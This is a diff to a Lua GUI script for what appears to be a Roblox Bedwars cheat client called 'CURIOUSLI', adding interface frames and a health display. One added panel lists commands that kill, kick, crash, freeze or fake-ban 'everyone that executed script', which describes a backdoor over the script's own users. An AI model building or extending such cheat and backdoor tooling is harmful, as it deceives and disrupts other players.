@@ -629,6 +629,154 @@ local_script_12.Parent = discord_button
 local right_shift = Instance.new("LocalScript")
 right_shift.Name = "RightShift"
 right_shift.Parent = curiousli
+	
+	
+
+local warn_list = Instance.new("Frame")
+warn_list.BackgroundColor3 = Color3.new(0.172549, 0.172549, 0.172549)
+warn_list.BackgroundTransparency = 1
+warn_list.Position = UDim2.new(0.729754329, 0, 0, 0)
+warn_list.Size = UDim2.new(0.270245671, 0, 1, 0)
+warn_list.Visible = true
+warn_list.Name = "WarnList"
+warn_list.Parent = curiousli
+
+local uilist_layouta = Instance.new("UIListLayout")
+uilist_layouta.SortOrder = Enum.SortOrder.LayoutOrder
+uilist_layouta.VerticalAlignment = Enum.VerticalAlignment.Bottom
+uilist_layouta.Parent = warn_list
+
+local heart = Instance.new("ImageLabel")
+heart.BackgroundColor3 = Color3.new(1, 1, 1)
+heart.BackgroundTransparency = 1
+heart.Position = UDim2.new(0.352387995, 0, 0.690526307, 0)
+heart.Size = UDim2.new(0.0236578714, 0, 0.0568421036, 0)
+heart.Visible = false
+heart.Name = "Heart"
+heart.Parent = curiousli
+
+local maina = Instance.new("TextLabel")
+maina.Font = Enum.Font.SourceSans
+maina.Text = "0"
+maina.TextColor3 = Color3.new(1, 1, 1)
+maina.TextScaled = true
+maina.TextSize = 14
+maina.TextWrapped = true
+maina.BackgroundColor3 = Color3.new(1, 1, 1)
+maina.BackgroundTransparency = 1
+maina.Position = UDim2.new(1.42307687, 0, -0.111111112, 0)
+maina.Size = UDim2.new(6.07692289, 0, 1.18518519, 0)
+maina.Visible = true
+maina.Name = "Main"
+maina.Parent = heart
+
+
+local crash = Instance.new("Frame")
+crash.BackgroundColor3 = Color3.new(1, 1, 1)
+crash.Position = UDim2.new(0, 0, -0.414736837, 0)
+crash.Size = UDim2.new(1, 0, 1.41473687, 0)
+crash.Visible = false
+crash.ZIndex = 10
+crash.Name = "CRASH"
+crash.Parent = curiousli
+
+local main_8 = Instance.new("ImageLabel")
+main_8.BackgroundColor3 = Color3.new(1, 1, 1)
+main_8.BackgroundTransparency = 1
+main_8.Position = UDim2.new(0.317561507, 0, 0.502976179, 0)
+main_8.Size = UDim2.new(0.36396724, 0, 0.254285783, 0)
+main_8.Visible = true
+main_8.ZIndex = 15
+main_8.Name = "Main"
+main_8.Parent = crash
+
+local text_button = Instance.new("TextButton")
+text_button.Font = Enum.Font.SourceSans
+text_button.Text = ""
+text_button.TextColor3 = Color3.new(0, 0, 0)
+text_button.TextSize = 14
+text_button.BackgroundColor3 = Color3.new(1, 1, 1)
+text_button.BackgroundTransparency = 1
+text_button.Position = UDim2.new(0.694999993, 0, 0.784175813, 0)
+text_button.Size = UDim2.new(0.305000007, 0, 0.210674077, 0)
+text_button.Visible = true
+text_button.ZIndex = 17
+text_button.Parent = main_8
+
+text_button.MouseButton1Click:Connect(function()
+setfpfcap(9e9)
+end)
+
+local cmds = Instance.new("Frame")
+cmds.BackgroundColor3 = Color3.new(1, 0.909804, 0.45098)
+cmds.Position = UDim2.new(0.322110951, 0, 0.0442104936, 0)
+cmds.Size = UDim2.new(0.410373062, 0, 0.943158031, 0)
+cmds.Visible = false
+cmds.Name = "Cmds"
+cmds.Parent = curiousli
+
+local text_label = Instance.new("TextLabel")
+text_label.Font = Enum.Font.SourceSans
+text_label.RichText = true
+text_label.Text = "/kill default --Kills everyone that executed script                                               /kick default --Kicks everyone that executed script                                                                  /ban default --Does an fake bedwars ban to whoever executed script                    /disconnect default --false disconnects the people that executed script                                    /exkick default --Fake exploit disconnects people who executed script                             /lagback default --lagbacks them                                                /jump default --makes them jump                                          /sit default --makes them sit down                                            /unsit default  --makes them unsit                                                              /freeze default --freezes them                                                     /unfreeze default --unfreezes them                                         /void default --makes them go to the void                                                                     /crash default  --crashes them                                                                              /chip default --soon                                                                         /errorkick default --destroys their head and error kicks them   "
+text_label.TextColor3 = Color3.new(0, 0, 0)
+text_label.TextScaled = true
+text_label.TextSize = 14
+text_label.TextWrapped = true
+text_label.TextYAlignment = Enum.TextYAlignment.Top
+text_label.BackgroundColor3 = Color3.new(1, 1, 1)
+text_label.BackgroundTransparency = 1
+text_label.Size = UDim2.new(1, 0, 1, 0)
+text_label.Visible = true
+text_label.Parent = cmds
+
+local private = Instance.new("TextLabel")
+private.Font = Enum.Font.SourceSansBold
+private.Text = "CURIOUSLI"
+private.TextColor3 = Color3.new(0.721569, 0.505882, 0)
+private.TextScaled = true
+private.TextSize = 14
+private.TextWrapped = true
+private.BackgroundColor3 = Color3.new(1, 1, 1)
+private.BackgroundTransparency = 1
+private.Position = UDim2.new(0.826205611, 0, 0, 0)
+private.Size = UDim2.new(0.173794359, 0, 0.0821052641, 0)
+private.Visible = false
+private.Name = "Private"
+private.Parent = curiousli
+
+local main_9 = Instance.new("ImageLabel")
+main_9.BackgroundColor3 = Color3.new(1, 1, 1)
+main_9.BackgroundTransparency = 1
+main_9.Position = UDim2.new(0, 0, 1, 0)
+main_9.Size = UDim2.new(1, 0, 1.28205132, 0)
+main_9.Visible = true
+main_9.Name = "Main"
+main_9.Parent = private
+
+local happy = Instance.new("Frame")
+happy.BackgroundColor3 = Color3.new(1, 0.172549, 0.956863)
+happy.Position = UDim2.new(-0.0850000009, 0, -2.3599999, 0)
+happy.Size = UDim2.new(1.23483145, 0, 11.2600002, 0)
+happy.Visible = false
+happy.Name = "HAPPY"
+happy.Parent = curiousli
+
+local text_label_2 = Instance.new("TextLabel")
+text_label_2.Font = Enum.Font.SourceSans
+text_label_2.Text = "HAPPY NEW YEAR!"
+text_label_2.TextColor3 = Color3.new(0.921569, 1, 0.2)
+text_label_2.TextScaled = true
+text_label_2.TextSize = 14
+text_label_2.TextWrapped = true
+text_label_2.BackgroundColor3 = Color3.new(1, 1, 1)
+text_label_2.BackgroundTransparency = 1
+text_label_2.Position = UDim2.new(0.0684169233, 0, 0.219089463, 0)
+text_label_2.Size = UDim2.new(0.809827089, 0, 0.0420678705, 0)
+text_label_2.Visible = true
+text_label_2.ZIndex = 4
+text_label_2.Parent = happy
+
 
 --//Modules
 
@@ -1599,6 +1747,10 @@ task.spawn(function()
 	end)
 end)
 
+	
+while wait(0.1) do
+    maina.Text = game.Players.LocalPlayer.Character.Humanoid.Health.."/"..game.Players.LocalPlayer.Character.Humanoid.MaxHealth
+end
 
 	--end--
 end
